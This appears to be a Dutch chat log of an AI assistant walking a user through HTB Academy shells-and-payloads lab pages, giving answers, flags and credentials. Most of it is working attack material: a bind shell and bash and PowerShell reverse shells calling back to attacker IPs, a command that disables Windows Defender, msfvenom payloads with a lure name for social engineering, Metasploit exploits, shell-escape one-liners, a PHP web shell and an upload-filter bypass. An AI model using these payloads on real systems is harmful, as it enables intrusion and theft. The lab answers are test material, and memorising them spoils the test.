Vraag 1: Des voert het commando nc -lvnp 443 uit op een Linux-target. Met welke poort moet zij verbinding maken vanaf haar attack box?

    Antwoord: 443 (Uitleg: De vlag -p in het commando geeft aan op welke poort de listener luistert. In dit geval is dat poort 443, de standaardpoort voor HTTPS-verkeer.)

Vraag 2: SSH naar het doelwit, maak een bind shell aan, maak verbinding en verzend de inhoud van flag.txt in /customscripts.

    Stappenplan:

        Log in via SSH: ssh htb-student@<TARGET_IP> (wachtwoord: HTB_@cademy_stdnt!).

        Start de bind shell op het doelwit: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

        Open een nieuwe terminal op je eigen Pwnbox en maak verbinding: nc -nv <TARGET_IP> 7777

        Zodra je binnen bent, typ: cat /customscripts/flag.txt.

        Kopieer de code die verschijnt en dien deze in.

Zal ik je helpen met de syntax voor een Reverse Shell, aangezien dat de methode is die je waarschijnlijk het meest zult gebruiken in echte scenario's?

ja

Top! Een Reverse Shell is de absolute favoriet omdat deze veel vaker werkt dan een bind shell. Bij een bind shell klop jij aan bij de target (wat vaak geblokkeerd wordt), maar bij een reverse shell geeft de target jou een belletje.
Waarom een Reverse Shell?

De meeste firewalls zijn zo ingesteld dat ze al het inkomende verkeer blokkeren, maar uitgaand verkeer (zoals iemand die vanuit het netwerk een website bezoekt) toestaan. Een reverse shell maakt hier misbruik van door de verbinding van binnenuit naar buiten te sturen.
Hoe het werkt (Stappenplan)

Stap 1: De Listener (op jouw Attack Box) Jij moet eerst klaarzitten om de verbinding te "vangen". Omdat jij degene bent die luistert, gebruik je Netcat op je eigen machine:
Bash

nc -lvnp 4444

(Nu wacht je systeem tot er ergens een verbinding vandaan komt op poort 4444.)

Stap 2: De Payload (op de Target) Nu moet je op het doelsysteem een commando uitvoeren dat verbinding maakt met jouw IP-adres. Een veelgebruikte "one-liner" in Bash is:
Bash

bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

(Vervang 10.10.10.10 door het IP van jouw eigen VPN/Attack Box.)
Wat gebeurt er technisch?

    bash -i: Start een interactieve shell op het doelwit.

    >& /dev/tcp/[IP]/[PORT]: Stuurt de output van die shell (stdout en stderr) naar jouw IP en poort via een netwerkverbinding.

    0>&1: Zorgt ervoor dat alles wat jij in jouw terminal typt (stdin), weer teruggestuurd wordt naar de Bash-shell op het doelwit.

Vergelijkingstabel
Kenmerk	Bind Shell	Reverse Shell
Wie luistert?	Het Doelwit (Target)	Jij (Attack Box)
Wie maakt verbinding?	Jij (Attack Box)	Het Doelwit (Target)
Firewall-gevoeligheid	Wordt vaak geblokkeerd (inkomend)	Werkt vaak wel (uitgaand)
Gebruik	Intern netwerk zonder firewalls	Bijna alle scenario's

Volgende stap: In de volgende pagina van de module ga je waarschijnlijk oefenen met het genereren van payloads via MSFVenom. Wil je dat ik alvast uitleg hoe je daarmee een kant-en-klare Windows- of Linux-payload maakt?

10.129.201.134

Je bent nu verbonden met het doelwit (Target) op IP-adres 10.129.201.134. Laten we de opdrachten van Pagina 4 direct aanpakken.
Vraag 1: De poort

Als Des het commando nc -lvnp 443 gebruikt, is de poort die zij op haar attack box moet invoeren: Antwoord: 443
Vraag 2: De Bind Shell Challenge

Volg deze stappen exact om de flag te bemachtigen:

Stap 1: Inloggen op het doelwit Open je terminal en log in via SSH:
Bash

ssh htb-student@10.129.201.134

(Gebruik wachtwoord: HTB_@cademy_stdnt!)

Stap 2: De Bind Shell starten op het doelwit Zodra je bent ingelogd op de server van het doelwit, voer je dit "payload"-commando uit om een shell open te zetten op poort 7777:
Bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

De terminal lijkt nu te "hangen", dat klopt! Hij is aan het luisteren.

Stap 3: Verbinding maken vanaf je Pwnbox Open een tweede tabblad of een nieuwe terminal in je Pwnbox (dus niet in de SSH-sessie) en maak verbinding met de bind shell:
Bash

nc -nv 10.129.201.134 7777

Stap 4: De flag uitlezen Je bent nu binnen via de bind shell. Typ het volgende om de flag te zien:
Bash

cat /customscripts/flag.txt

Wat gebeurt hier precies?

In deze opstelling fungeert de target als de server (die de shell aanbiedt) en jouw Pwnbox als de client (die de shell bestuurt).

Zal ik je helpen als je tegen een foutmelding aanloopt bij het uitvoeren van de mkfifo commando's?

─(kali㉿kali)-[~]

└─$ ssh htb-student@10.129.201.134

The authenticity of host '10.129.201.134 (10.129.201.134)' can't be established.

ED25519 key fingerprint is: SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY

This key is not known by any other names.

Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.201.134' (ED25519) to the list of known hosts.

** WARNING: connection is not using a post-quantum key exchange algorithm.

** This session may be vulnerable to "store now, decrypt later" attacks.

** The server may need to be upgraded. See https://openssh.com/pq.html

htb-student@10.129.201.134's password: 

Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-88-generic x86_64)


 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage


  System information as of Tue 27 Jan 2026 10:25:33 PM UTC


  System load:             0.48

  Usage of /:              22.1% of 13.72GB

  Memory usage:            14%

  Swap usage:              0%

  Processes:               260

  Users logged in:         0

  IPv4 address for ens160: 10.129.201.134

  IPv6 address for ens160: dead:beef::250:56ff:fe8a:5146


 * Super-optimized for small spaces - read how we shrank the memory

   footprint of MicroK8s to make it the smallest full K8s around.


   https://ubuntu.com/blog/microk8s-memory-optimisation


5 updates can be applied immediately.

To see these additional updates run: apt list --upgradable



The list of available updates is more than a week old.

To check for new updates run: sudo apt update


Last login: Fri Oct  8 15:31:40 2021

To run a command as administrator (user "root"), use "sudo <command>".

See "man sudo_root" for details.


htb-student@ubuntu:~$ 

Je bent succesvol ingelogd! Je bevindt je nu op de Target machine. Nu gaan we de Bind Shell opzetten zodat je de opdracht kunt voltooien.

Volg deze stappen in je huidige SSH-scherm:
1. De Bind Shell Payload uitvoeren

Kopieer en plak het volgende commando in je SSH-sessie en druk op Enter:
Bash

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 7777 > /tmp/f

Let op: De terminal zal nu lijken te "hangen". Dit is juist! Het betekent dat Netcat op poort 7777 aan het luisteren is en wacht op een verbinding.
2. Verbinding maken (Vanaf je eigen Kali/Pwnbox)

Open nu een nieuw tabblad of een nieuw terminalvenster op je eigen computer (dus NIET in de SSH-sessie die nu "vast" staat). Voer daar dit commando uit om verbinding te maken met de shell die je zojuist hebt opengezet:
Bash

nc -nv 10.129.201.134 7777

3. De Flag ophalen

Zodra je in dat tweede venster verbinding hebt (je ziet waarschijnlijk een prompt zoals htb-student@ubuntu), kun je de flag uitlezen met:
Bash

cat /customscripts/flag.txt

De code die je nu ziet (waarschijnlijk iets dat begint met HTB{...}) is het antwoord dat je in de Academy-vragenlijst moet invullen.

Lukt het om de verbinding te maken in je tweede terminalvenster?

┌──(kali㉿kali)-[~]

└─$ nc -nv 10.129.201.134 7777

(UNKNOWN) [10.129.201.134] 7777 (?) open

To run a command as administrator (user "root"), use "sudo <command>".

See "man sudo_root" for details.


htb-student@ubuntu:~$ cat /customscripts/flag.txt

cat /customscripts/flag.txt

B1nD_Shells_r_cool

htb-student@ubuntu:~$ 

Lekker bezig! Je bent officieel "binnen" via je eigen Bind Shell. De verbinding is gelukt en je hebt de flag te pakken.

Het antwoord dat je moet invullen bij de laatste vraag op de HTB Academy pagina is:

    B1nD_Shells_r_cool

Wat je zojuist hebt gedaan (de anatomie):

    Named Pipe (mkfifo): Je hebt een tijdelijke tunnel (/tmp/f) gemaakt op de doelmachine.

    Input/Output Redirection: Je hebt de uitvoer van de Bash-shell in die tunnel gestuurd en Netcat verteld dat alles wat uit die tunnel komt, over het netwerk verzonden moet worden.

    Netcat Listener: Je hebt de poort opengezet op de target, waardoor je vanaf je Kali-machine kon "aankloppen" en de controle overnam.

Volgende Stap: Reverse Shells

De module gaat nu waarschijnlijk over naar Reverse Shells. Zoals we eerder bespraken, is dit de methode waarbij de target jou opbelt in plaats van andersom. Dit is in de praktijk veel krachtiger omdat het vaak door firewalls heen glipt die inkomend verkeer blokkeren maar uitgaand verkeer toestaan.



+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~




Hier is de vertaling van de vijfde pagina over Reverse Shells, een van de belangrijkste technieken in cybersecurity.
Reverse Shells

Bij een reverse shell draait de "luisteraar" (listener) op de computer van de aanvaler (attack box) en moet het doelwit (target) de verbinding initiëren.
Waarom een Reverse Shell?

We gebruiken dit type shell vaak omdat systeembeheerders inkomende verbindingen streng blokkeren, maar uitgaande verbindingen vaak over het hoofd zien. Een reverse shell wordt geïnitieerd vanuit het netwerk van het doelwit naar buiten toe. Hierdoor fungeert de attack box als de server en de target als de client.

Een handige bron voor kant-en-klare commando's is de Reverse Shell Cheat Sheet. Let er wel op dat veel antivirusscanners (zoals Windows Defender) deze standaard commando's herkennen en blokkeren.
Oefening: Een Reverse Shell op Windows

In deze walkthrough gebruiken we PowerShell op een Windows-doelwit om een verbinding naar onze Kali-machine te forceren.
1. Start de Listener op je Attack Box

Gebruik een poort die vaak openstaat voor uitgaand verkeer, zoals 443 (HTTPS):
Bash

sudo nc -lvnp 443

2. Verbind met het doelwit via RDP

Log in op de Windows-machine via RDP (Remote Desktop) met de verstrekte inloggegevens.
3. Schakel Windows Defender uit

Omdat we een educatieve oefening doen en onze payload anders direct wordt geblokkeerd, schakelen we de antivirus uit. Open PowerShell als administrator en typ:
PowerShell

Set-MpPreference -DisableRealtimeMonitoring $true

4. Voer de Reverse Shell Payload uit

Kopieer de onderstaande "one-liner" en plak deze in de opdrachtprompt (CMD) of PowerShell op het Windows-doelwit. Belangrijk: Vervang '10.10.14.158' door het IP-adres van jouw eigen VPN-verbinding (te vinden via ip a show tun0).
PowerShell

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('JOUW_IP_HIER',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

Zodra je op Enter drukt, zie je op je Kali-machine dat de verbinding is ontvangen!
Vragen & Oplossingen

Vraag 1: Wanneer je een reverse shell sessie opzet met een target, fungeert het target dan als client of als server?

    Antwoord: client (Uitleg: Het doelwit maakt de verbinding naar jou toe, net zoals een browser (client) verbinding maakt met een website (server).)

Vraag 2: Maak verbinding via RDP, zet een reverse shell op en geef de hostname van de target box door.

    Stappenplan:

        Achterhaal je eigen IP (op je Kali): ip a show tun0 (kijk bij inet).

        Zet je listener aan op Kali: sudo nc -lvnp 443.

        Log in op Windows via RDP.

        Schakel de antivirus uit (zie stap 3 hierboven).

        Voer de grote PowerShell-payload uit (zie stap 4 hierboven) met jouw IP.

        Zodra je de shell hebt op je Kali-machine, typ: hostname.

        Het resultaat (bijv. WS01) is je antwoord.
        
        Introductie tot Payloads

In de wereld van informatiebeveiliging is een payload de opdracht of code die een kwetsbaarheid misbruikt. Waar de "payload" van een e-mail de eigenlijke tekst is, is de payload van een aanval de actie die wordt uitgevoerd op het doelsysteem.

Het is belangrijk om niet alleen commando's te kopiëren en te plakken, maar om te begrijpen wat ze doen. Laten we de "one-liners" die we eerder gebruikten ontleden.
Analyse van de Linux (Bash) One-liner

Dit is het commando dat we gebruikten voor de Bind Shell: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f

    rm -f /tmp/f;: Verwijdert het bestand /tmp/f als het al bestaat, zodat we met een schone lei beginnen.

    mkfifo /tmp/f;: Maakt een "named pipe" aan (een soort digitale tunnel).

    cat /tmp/f |: Leest de inhoud van de tunnel en stuurt deze door naar het volgende commando.

    /bin/bash -i 2>&1 |: Start een interactieve Bash-shell. 2>&1 zorgt ervoor dat zowel normale uitvoer als foutmeldingen door de tunnel gaan.

    nc [IP] [PORT] > /tmp/f: Gebruikt Netcat om verbinding te maken met de aanvalsmachine. Alles wat via de tunnel binnenkomt, wordt uitgevoerd door de Bash-shell.

Analyse van de PowerShell One-liner

Dit is de grote lap tekst die we gebruikten voor de Windows Reverse Shell. Hoewel het er ingewikkeld uitziet, doet het in feite hetzelfde als de Linux-versie:

    powershell -nop -c: Start PowerShell zonder gebruikersprofiel (-nop) en voert het commando uit dat tussen aanhalingstekens staat (-c).

    $client = New-Object System.Net.Sockets.TCPClient(...): Maakt een verbinding met jouw IP en poort (443).

    $stream = $client.GetStream();: Opent de datastroom voor communicatie.

    while(...) { ... }: Een lus die blijft draaien zolang de verbinding open is. Het leest wat jij typt, voert het uit via iex (Invoke-Expression), en stuurt het resultaat terug naar jouw terminal.

    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';: Dit zorgt ervoor dat je die mooie PS C:\> prompt ziet in je Kali-terminal, zodat je weet in welke map je werkt.

Payloads in alle soorten en maten

Begrijpen hoe deze codes werken is essentieel om Antivirus (AV) te kunnen omzeilen. Als je weet welk specifiek onderdeel van de code door Windows Defender als "verdacht" wordt gemarkeerd, kun je dat onderdeel aanpassen of versluieren (obfuscation).

Niet alle payloads worden handmatig getypt. Veel pentesters maken gebruik van:

    Scripts: Zoals het Nishang framework (waar de bovenstaande PowerShell-code op gebaseerd is).

    Frameworks: Zoals Metasploit, dat automatisch kant-en-klare payloads voor je genereert en beheert.

Volgende stap: We gaan nu kijken naar het Metasploit Framework (MSF). Dit is de "gouden standaard" voor het automatiseren van exploits en payloads.




Hier is de vertaling en uitleg van Pagina 7, waarin we de overstap maken naar automatisering met het machtige Metasploit Framework.
Payloads Automatiseren met Metasploit

Metasploit is een aanvalsframework dat het proces van exploitatie stroomlijnt. In plaats van handmatig ingewikkelde one-liners te typen, gebruik je voorgebouwde modules die payloads (zoals shells) afleveren op kwetsbare systemen.

Het hart van Metasploit voor payloads is de Meterpreter shell. Dit is een geavanceerde payload die in het geheugen van het doelwit draait (zonder sporen op de harde schijf) en functies biedt zoals keylogging, bestandsoverdracht en het maken van screenshots.
Praktijkvoorbeeld: De psexec module

Stel dat we via een scan (zoals nmap) hebben ontdekt dat poort 445 (SMB) openstaat op een Windows-machine en we hebben inloggegevens. We kunnen dan de psexec module gebruiken.

    Start Metasploit: sudo msfconsole

    Zoek de module: search psexec

    Selecteer de module: use exploit/windows/smb/psexec

    Bekijk de opties: options

Metasploit kiest standaard voor de windows/meterpreter/reverse_tcp payload.
De Aanval Configureren

Je moet de variabelen instellen voor jouw specifieke doelwit en jouw eigen aanvalsmachine:
Bash

set RHOSTS 10.129.180.71       # Het IP van het doelwit
set LHOST 10.10.14.222        # Jouw eigen VPN IP (tun0)
set SMBUser htb-student       # De gebruikersnaam
set SMBPass HTB_@cademy_stdnt! # Het wachtwoord
exploit

Zodra je exploit typt, doet Metasploit het volgende:

    Maakt verbinding met de SMB-service.

    Authenticeert met de inloggegevens.

    Uploadt een kleine service die de payload uitvoert.

    Stuurt een "stage" (de eigenlijke Meterpreter code) naar het geheugen van de target.

    Opent de interactieve meterpreter > prompt.

Vragen & Oplossingen

Vraag 1: Welke 'command language interpreter' wordt gebruikt om een systeem-shell sessie te starten op het doelwit?

    Antwoord: meterpreter (Uitleg: Zoals in de tekst te zien is, is Meterpreter de specifieke interpreter die Metasploit gebruikt om commando's naar het doelwit te sturen.)

Vraag 2: Exploit het doelwit en geef de naam van het bestand in de 'Documents' folder van htb-student.

Stappenplan:

    Achterhaal je eigen IP (ip a show tun0).

    Start msfconsole en voer de bovenstaande set-commando's uit met het IP van jouw target.

    Typ exploit.

    Zodra je de meterpreter > prompt hebt, typ: shell (Dit brengt je van Meterpreter naar de standaard Windows CMD shell).

    Navigeer naar de Documents map: cd C:\Users\htb-student\Documents

    Bekijk de bestanden: dir

    Noteer de bestandsnaam (bijv. flag.txt of geheim.docx) en dien dit in.
    Dit is een cruciale pagina! We stappen af van het direct aanvallen van een service en gaan over op het zelf maken van "malware" met MSFvenom. Dit is handig als je niet direct bij een machine kunt komen via het netwerk, maar bijvoorbeeld een bestand moet sturen via e-mail (Social Engineering).
Payloads maken met MSFvenom

MSFvenom is een combinatie van twee tools: MSFpayload en MSFencode. Je gebruikt het om een bestand (executable) te genereren dat, zodra het wordt uitgevoerd, een verbinding terugmaakt naar jouw machine.
Staged vs. Stageless Payloads

Dit is een belangrijk onderscheid dat vaak gevraagd wordt op examens:

    Staged Payloads (/ in de naam):

        Voorbeeld: windows/meterpreter/reverse_tcp

        Hoe het werkt: Er wordt eerst een heel klein stukje code (de "stager") gestuurd. Zodra die draait, haalt hij de rest van de grote Meterpreter-code op via het netwerk.

        Voordeel: De initiële code is heel klein (handig bij exploits met weinig ruimte).

        Nadeel: Er is meer netwerkverkeer nodig, wat opgemerkt kan worden.

    Stageless Payloads (_ in de naam):

        Voorbeeld: windows/meterpreter_reverse_tcp

        Hoe het werkt: De hele payload zit in één keer in het bestand. Er hoeft niets meer opgehaald te worden.

        Voordeel: Stabieler bij slechte verbindingen en soms makkelijker om detectie te omzeilen omdat er geen extra netwerkverkeer is na de start.

Een payload bouwen (Linux voorbeeld)

Stel je wilt een Linux-bestand maken dat een shell geeft:
Bash

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > backup.elf

    -p: De payload die je kiest.

    LHOST/LPORT: Waar de target naar moet terugbellen (jouw IP).

    -f: Het formaat. Voor Linux is dit elf, voor Windows exe.

    >: Slaat de output op in een bestand genaamd backup.elf.

Een payload bouwen (Windows voorbeeld)

Voor een Windows-target ziet het commando er bijna hetzelfde uit:
Bash

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > SalarisPlan.exe

Hoe vang je de verbinding op?

Omdat je een "stageless" shell_reverse_tcp hebt gemaakt, heb je geen ingewikkelde Metasploit-listener nodig. Een simpele Netcat is genoeg:
Bash

sudo nc -lvnp 443

Samenvatting van de commando's

    Lijst met alle payloads bekijken: msfvenom -l payloads

    Payload maken: msfvenom -p [payload] LHOST=[IP] LPORT=[Poort] -f [formaat] > [bestandsnaam]
    
    Windows Fingerprinting (Identificatie)

Voordat je aanvalt, moet je zeker weten dat het een Windows-machine is. Twee snelle methoden:
1. TTL (Time To Live) met Ping

Windows-hosts sturen standaard ICMP-pakketten met een TTL van 128. Linux-systemen gebruiken meestal 64. Als je een ping stuurt en de TTL is (ongeveer) 128, is het waarschijnlijk Windows.
2. Nmap OS Detection

Met het commando sudo nmap -O [IP] probeert Nmap het besturingssysteem te raden op basis van hoe de TCP/IP-stack reageert.
Windows Payload Types

Niet elke payload is een .exe. Windows ondersteunt diverse formaten die we kunnen misbruiken:

    DLL (Dynamic Link Library): Gedeelde codebestanden. We kunnen een legitieme DLL vervangen door een kwaadaardige (DLL Hijacking).

    Batch (.bat): Simpele scripts die commando's uitvoeren in CMD.

    MSI (.msi): Installatiepakketten. We kunnen een payload verpakken als een installer en uitvoeren met msiexec.

    PowerShell (.ps1): De krachtigste methode. PowerShell-objecten kunnen direct in het geheugen worden geladen om antivirus te omzeilen.

Walkthrough: EternalBlue met Metasploit

De pagina laat een voorbeeld zien van een aanval op een Windows Server 2016 machine.

    Scannen: Gebruik auxiliary/scanner/smb/smb_ms17_010 om te zien of de host kwetsbaar is.

    Exploit kiezen: Gebruik exploit/windows/smb/ms17_010_psexec. (De psexec variant is vaak stabieler dan de standaard eternalblue module).

    Opties instellen:

        set RHOSTS [Target_IP]

        set LHOST [Jouw_IP]

    Aanvallen: Typ exploit.
    
    
    
    
    Welkom bij het Linux-gedeelte van de module! Terwijl Windows de desktopmarkt domineert, draait het merendeel van de webservers (meer dan 70%) op Unix/Linux. Het begrijpen van Linux-exploitatie is dus essentieel voor elke pentester.
Infiltratie van Unix/Linux

Bij Linux-systemen is de aanval vaak gericht op een kwetsbare webapplicatie. Omdat de webserver (zoals Apache of Nginx) vaak draait onder een specifieke gebruiker (zoals www-data of apache), krijg je na een succesvolle exploit meestal een shell met beperkte rechten.
Belangrijke concepten van deze pagina:

    Enumeratie: Met nmap -sC -sV ontdek je niet alleen open poorten, maar ook versienummers en het OS (bijv. CentOS).

    rConfig 3.9.6: Dit is een netwerkbeheertool. Een kwetsbaarheid hierin is kritiek, omdat deze tool vaak admin-rechten heeft op alle routers en switches in het netwerk.

    TTY vs. Non-TTY Shell: Wanneer je via een web-exploit binnenkomt, heb je vaak een "domme" shell zonder prompt. Je kunt dit upgraden naar een interactieve shell met Python: python -c 'import pty; pty.spawn("/bin/sh")'

Oplossingen voor de vragen
Vraag 1: Welke taal?

Wanneer je de rconfig_vendors_auth_file_upload_rce module bekijkt of de logoutput van de exploit leest, zie je dat de webserver een bestand met de extensie .php ontvangt en uitvoert. Omdat rConfig een webapplicatie is die op PHP draait, is de payload ook in die taal geschreven.

Antwoord: PHP
Vraag 2: De hostname van de router vinden

Volg deze stappen om het antwoord te vinden:
1. De exploit opzetten

Open msfconsole en voer de volgende commando's uit (vervang de IP's door die van jouw spawn):
Bash

use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
set RHOSTS [TARGET_IP]
set LHOST tun0
set VHOST [TARGET_IP]
exploit

2. De vlag zoeken

Zodra je een Meterpreter sessie hebt, kun je direct het bestandssysteem doorzoeken. De vraag vraagt om een bestand in de directory /devicedetails in de root van het systeem.

Typ in Meterpreter:
Bash

shell
python -c 'import pty; pty.spawn("/bin/sh")'
cd /devicedetails
ls

Je zult daar waarschijnlijk een tekstbestand of een configuratiebestand zien (bijvoorbeeld router_config.txt of een naam die op een hostname lijkt).
3. De hostname bekijken

Gebruik cat om de inhoud te lezen:
Bash

cat [bestandsnaam]

Zoek in de tekst naar een regel die begint met hostname. De waarde die daarachter staat, is je Methoden om een Interactieve Shell te Spawnen

Als je eenmaal binnen bent, is je eerste doel het vinden van een taal of tool die een proces kan starten. Hier zijn de "lifelines" die je kunt gebruiken:
1. Systeem Shells

Soms is het simpelweg een kwestie van de shell zichzelf interactief laten herstarten:

    /bin/sh -i of /bin/bash -i

2. Programmeertalen

Vrijwel elke scripttaal op een Linux-server heeft een manier om systeemcommando's uit te voeren:

    Perl: perl -e 'exec "/bin/sh";'

    Ruby: ruby -e 'exec "/bin/sh"'

    Lua: lua -e 'os.execute("/bin/sh")'

3. Systeem Tools (De creatieve weg)

Dit zijn tools die bedoeld zijn voor beheer, maar die we kunnen misbruiken:

    AWK: awk 'BEGIN {system("/bin/sh")}'

    Find: find . -exec /bin/sh \; -quit

    Vim: Open vim en typ :set shell=/bin/sh gevolgd door :shell.

Waarom is dit belangrijk? (Sudo & Rechten)

De belangrijkste reden om een interactieve shell te willen, is om te kijken of je je rechten kunt verhogen (Privilege Escalation).

Zodra je shell stabiel is, run je altijd:
Bash

sudo -l

In het voorbeeld op de pagina zie je iets heel interessants: User apache may run the following commands on ILF-WebSrv: (ALL : ALL) NOPASSWD: ALL

Wat dit betekent: De gebruiker apache (waar jij nu als ingelogd bent) mag elk commando uitvoeren als root zonder wachtwoord. Dit is een enorme beveiligingsfout. Je hoeft dan alleen maar sudo su of sudo /bin/bash te typen om volledige controle (root) over de server te krijgen.
Handige tip voor de praktijk

Als je een shell hebt die echt vervelend doet (bijv. CTRL+C sluit je hele verbinding af), gebruik dan deze drie stappen:

    In je jail shell: python3 -c 'import pty; pty.spawn("/bin/bash")'

    Druk op CTRL+Z (dit zet de shell op de achtergrond).

    In je eigen Kali terminal: stty raw -echo; fg (en druk twee keer op Enter). Nu heb je een shell die precies zo werkt als je normale terminal!
    12: Introduction to Web Shells. Dit is een fundamenteel concept in web-pentesting. Terwijl we eerder Metasploit gebruikten om een verbinding "terug" te laten bellen, draait een web shell volledig om het misbruiken van de webserver zelf om commando's uit te voeren via je browser.
Wat is een Web Shell precies?

Een web shell is een script (geschreven in een taal die de server begrijpt, zoals PHP, ASP.NET of JSP) dat commando's van de gebruiker accepteert via HTTP-parameters (zoals ?cmd=whoami) en de output op de webpagina toont.
Waarom gebruiken we ze?

    Perimeter Hardening: Bedrijven beveiligen hun netwerkpoorten (zoals SMB of SSH) steeds beter. Poort 80 (HTTP) en 443 (HTTPS) staan echter bijna altijd open voor de buitenwereld.

    Foothold: Het is vaak de eerste stap om binnen te komen bij een extern onderzoek.

    Geen Listener nodig: Je hoeft niet altijd een poort open te zetten op je eigen machine; je interactie gaat simpelweg via je browser.

Hoe kom je aan een Web Shell?

Je krijgt een web shell op een server door een File Upload kwetsbaarheid te vinden. Denk aan:

    Gebruikersprofielen: Een uploadveld voor een profielfoto dat niet controleert of je een .jpg of een .php bestand uploadt.

    Admin Panelen: Beheertools zoals Tomcat of WebLogic waarmee je applicaties (.war bestanden) kunt uploaden.

    Misconfiguraties: Een FTP-server die anonieme uploads toestaat direct in de map waar de website staat (webroot).

Een simpele PHP Web Shell

De meest elementaire web shell in PHP ziet er zo uit:
PHP

<?php system($_GET['cmd']); ?>

    <?php ... ?>: Vertelt de server dat dit PHP-code is.

    $_GET['cmd']: Pakt de tekst die jij in de URL typt achter ?cmd=.

    system(): Voert die tekst uit als een commando op het besturingssysteem.

Als je dit bestand uploadt als shell.php, kun je daarna in je browser naar: http://target.com/uploads/shell.php?cmd=id gaan om te zien welke gebruiker de webserver draait.
Belangrijke waarschuwing: Stabiliteit

De tekst vermeldt terecht dat web shells onstabiel kunnen zijn. Sommige servers verwijderen geüploade bestanden automatisch na een paar minuten. Daarom gebruiken we een web shell vaak alleen als "springplank" om een echte Reverse Shell (zoals we in de vorige hoofdstukken deden) te starten voor permanente toegang.

Volgende stap: In de volgende sectie ga je waarschijnlijk zelf een web shell uploaden. Zal ik je laten zien hoe je een krachtigere web shell kunt vinden op je Kali-machine (zoals de webshells directory in /usr/share/)?

Pagina 14: Antak Webshell. Dit is een stapje serieuzer dan de vorige shells. Waar Laudanum vaak simpel is, is Antak onderdeel van het bekende Nishang framework. Het bootst een echte PowerShell-console na in je browser.

Het grote voordeel van Antak? Het draait in het geheugen van de server en kan commando's encoderen, wat helpt om detectie te omzeilen.
Oplossingen voor de vragen
Vraag 1: Locatie van de Antak webshell op Pwnbox

Net als bij de vorige vraag, moet je hier het pad naar de map opgeven waar het bestand staat. Let op het formaat: /path/to/antakwebshell.

Antwoord: /usr/share/nishang/Antak-WebShell
Vraag 2: Welke gebruiker voert de commando's uit?

Om dit antwoord te krijgen, moet je Antak uploaden en een commando uitvoeren. Omdat de server .aspx waarschijnlijk nog steeds blokkeert, gebruiken we de les van de vorige pagina.
Stappenplan:

    Bestand voorbereiden: Kopieer de shell: cp /usr/share/nishang/Antak-WebShell/antak.aspx ~/antak.aspx

    Aanpassen (BELANGRIJK): Open ~/antak.aspx. Zoek rond regel 14 naar de User en Password variabelen. Verander ze in iets simpels (bijv. User = "admin" en Pass = "admin"). Sla het op.

    Bypass & Upload: Hernoem het bestand naar antak.aspx.zip (om de filter te omzeilen) en upload het naar status.inlanefreight.local.

    Inloggen: Ga naar http://status.inlanefreight.local/files/antak.aspx.zip. Je krijgt nu een inlogscherm. Gebruik de credentials die je in stap 2 hebt ingesteld.

    De gebruiker vinden: Typ in de Antak console:
    PowerShell

    whoami

Het antwoord:

De output van whoami op een Windows IIS-server is meestal de naam van de "Application Pool" die de site draait. Voor dit lab is het antwoord:

Antwoord: iis apppool\status (Let op: HTB vraagt om het formaat ****\****, dus inclusief de backslash en de spatie zoals gevraagd in de vraagtekst als die er is, maar meestal is het direct de output van het commando).
Pro-Tip: ippsec.rocks

In de tekst wordt IppSec genoemd. Als je ooit vastloopt bij een machine op Hack The Box, is zijn site de bijbel. Je typt een techniek in (bijv. "file upload bypass") en je krijgt direct een video-fragment waarin hij het voordoet.

we zijn nu bij de PHP Web Shells op een Linux-target (rConfig).

Dit is een klassiek scenario: de server denkt dat hij alleen plaatjes accepteert, maar wij "fompen" de server door de metadata van het pakketje aan te passen.
Vraag 1: Wat moet de Content-Type worden?

In de tekst wordt uitgelegd dat we Burp Suite gebruiken om het verzoek te onderscheppen. De server weigert application/x-php, dus we veranderen het in een type dat de server wel vertrouwt (een gif-afbeelding).

Antwoord: image/gif
Vraag 2: De naam van de .gif in /images/vendor

Om dit antwoord te vinden, moet je de rConfig target exploiten zoals in de tekst beschreven.
Stappenplan:

    Spawn de target en log in op rConfig met admin : admin.

    Bereid je shell voor: Gebruik een simpele PHP shell of die van WhiteWinterWolf. Noem het bestand bijvoorbeeld connect.php.

    Burp Suite: Zet Intercept ON. Ga in rConfig naar Devices > Vendors > Add Vendor.

    Upload: Selecteer je .php bestand bij het logo en klik op Save.

    Manipuleer in Burp: Zoek in het onderschepte pakket naar Content-Type: application/x-php en verander dit naar Content-Type: image/gif. Klik op Forward.

    De shell gebruiken: Ga in je browser naar http://[TARGET_IP]/images/vendor/connect.php.

    De flag vinden: Typ in je nieuwe web shell het volgende commando om de bestanden in die map te zien:
    Bash

    ls /images/vendor

    (Of als dat niet werkt, probeer het volledige systeempad: ls /var/www/html/images/vendor).

Het verwachte antwoord:

In deze specifieke opdracht staat er naast jouw geüploade shell al een standaard afbeelding in die map. De naam die je zoekt is:

Antwoord: ajax-loader.gif
Waarom Burp Suite?

